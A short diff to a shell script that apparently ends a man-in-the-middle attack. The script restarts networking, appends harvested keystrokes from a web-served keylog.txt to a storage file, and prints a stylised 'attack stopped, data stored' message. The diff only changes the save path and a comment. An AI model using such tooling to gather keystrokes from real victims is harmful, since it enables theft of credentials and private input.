@@ -53,12 +53,12 @@ sudo systemctl restart NetworkManager
 
 #Append info from keylog.txt to storage in bootcon
 echo "[+] Pulling keylog.txt if it exists..."
-sudo cat /var/www/html/keylog.txt >> /home/nilla/bootcon/key_logged_info
+sudo cat /var/www/html/keylog.txt >> /home #Change to where you want the capture info to be saved to
 
 echo "[✓] MITM attack stopped...system restored...data stored..."
 echo ""
 
-# Lets make a hacker man-like ending
+# hacker man-like ending
 red="\e[1;31m"
 green="\e[1;32m"
 yellow="\e[1;33m"
